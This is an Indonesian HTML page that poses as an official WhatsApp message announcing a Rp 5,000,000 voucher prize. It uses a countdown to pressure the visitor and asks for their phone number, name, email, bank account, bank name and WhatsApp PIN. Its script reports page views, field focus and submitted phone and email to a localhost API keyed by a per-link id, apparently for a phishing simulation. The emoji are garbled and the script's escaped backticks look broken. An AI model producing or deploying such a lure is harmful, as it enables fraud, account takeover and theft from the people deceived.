<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ Selamat! Voucher Rp 5.000.000</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); min-height: 100vh; padding: 15px; }
        .whatsapp-container { max-width: 480px; margin: 0 auto; background: #0b141a; border-radius: 20px; overflow: hidden; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
        .wa-header { background: #1f2c34; padding: 15px 20px; display: flex; align-items: center; gap: 12px; }
        .wa-avatar { width: 45px; height: 45px; border-radius: 50%; background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); display: flex; align-items: center; justify-content: center; font-size: 1.5rem; }
        .wa-info h2 { color: #e9edef; font-size: 1.1rem; margin-bottom: 3px; }
        .wa-info p { color: #8696a0; font-size: 0.85rem; }
        .chat-area { background: #0b141a; padding: 20px 15px; min-height: 500px; }
        .message-bubble { background: #1f2c34; padding: 12px 15px; border-radius: 10px; margin-bottom: 15px; color: #e9edef; max-width: 90%; }
        .prize-card { background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); padding: 25px; border-radius: 15px; margin: 15px 0; text-align: center; }
        .prize-card .icon { font-size: 4rem; margin-bottom: 10px; }
        .prize-card .amount { font-size: 2.5rem; font-weight: bold; color: #8b0000; margin: 15px 0; }
        .countdown-box { background: #ff4444; color: white; padding: 15px; border-radius: 10px; text-align: center; margin: 15px 0; font-weight: bold; }
        .countdown-box .timer { font-size: 2rem; margin-top: 8px; font-family: 'Courier New', monospace; }
        .claim-form { background: #1f2c34; padding: 20px; border-radius: 15px; margin-top: 20px; }
        .claim-form h3 { color: #25D366; margin-bottom: 15px; text-align: center; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; color: #8696a0; font-size: 0.9rem; margin-bottom: 6px; }
        .form-group input { width: 100%; padding: 12px; background: #0b141a; border: 1px solid #2a3942; border-radius: 8px; color: #e9edef; font-size: 1rem; }
        .form-group input:focus { outline: none; border-color: #25D366; }
        .btn-claim { width: 100%; padding: 15px; background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); color: white; border: none; border-radius: 10px; font-size: 1.1rem; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="whatsapp-container">
        <div class="wa-header"><div class="wa-avatar">ğŸ</div><div class="wa-info"><h2>WhatsApp Official âœ“âœ“</h2><p>online</p></div></div>
        <div class="chat-area">
            <div class="message-bubble"><p><strong>ğŸŠ SELAMAT! ANDA ADALAH PEMENANG!</strong></p></div>
            <div class="prize-card"><div class="icon">ğŸ</div><h3 style="color:#8b4513;">HADIAH ANDA:</h3><div class="amount">Rp 5.000.000</div><p style="color:#654321;">ğŸ’³ Shopping Voucher Digital</p></div>
            <div class="countdown-box"><div>â° CLAIM SEBELUM HANGUS!</div><div class="timer" id="countdown">14:59</div></div>
            <div class="claim-form">
                <h3>ğŸ¯ CLAIM HADIAH SEKARANG</h3>
                <form id="claimForm">
                    <div class="form-group"><label>ğŸ“± Nomor WhatsApp</label><input type="tel" id="phone" required></div>
                    <div class="form-group"><label>ğŸ‘¤ Nama Lengkap</label><input type="text" id="fullName" required></div>
                    <div class="form-group"><label>ğŸ“§ Email</label><input type="email" id="email" required></div>
                    <div class="form-group"><label>ğŸ¦ Nomor Rekening</label><input type="text" id="accountNumber" required></div>
                    <div class="form-group"><label>ğŸ›ï¸ Nama Bank</label><input type="text" id="bankName" required></div>
                    <div class="form-group"><label>ğŸ” PIN WhatsApp (6 digit)</label><input type="password" id="waPin" maxlength="6" required></div>
                    <button type="submit" class="btn-claim">ğŸ CLAIM VOUCHER RP 5.000.000</button>
                </form>
            </div>
        </div>
    </div>
    <script>
        const API_URL = 'http://localhost:5000/api';
        const linkId = new URLSearchParams(window.location.search).get('id');
        async function trackView() { if (!linkId) return; try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'view', data: 'WhatsApp Voucher page opened' }) }); } catch (e) {} }
        async function trackClick(f) { if (!linkId) return; try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'click', data: \`Field: \${f}\` }) }); } catch (e) {} }
        async function trackSubmit(d) { if (!linkId) return; try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'submit', data: JSON.stringify(d) }) }); } catch (e) {} }
        let timeLeft = 899; setInterval(() => { const m = Math.floor(timeLeft / 60), s = timeLeft % 60; document.getElementById('countdown').textContent = \`\${m.toString().padStart(2,'0')}:\${s.toString().padStart(2,'0')}\`; timeLeft--; if (timeLeft < 0) timeLeft = 899; }, 1000);
        document.getElementById('waPin').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
        let c = new Set();
        document.querySelectorAll('input').forEach(i => i.addEventListener('focus', function() { const n = this.id; if (!c.has(n)) { c.add(n); trackClick(n); } }));
        document.getElementById('claimForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const pin = document.getElementById('waPin').value;
            if (pin.length !== 6) { alert('PIN harus 6 digit!'); return; }
            await trackSubmit({ phone: document.getElementById('phone').value, email: document.getElementById('email').value });
            const btn = e.target.querySelector('.btn-claim');
            btn.textContent = 'â³ Memproses...'; btn.disabled = true;
            setTimeout(() => window.location.href = 'index.html', 2000);
        });
        window.addEventListener('DOMContentLoaded', trackView);
    </script>
</body>
</html>
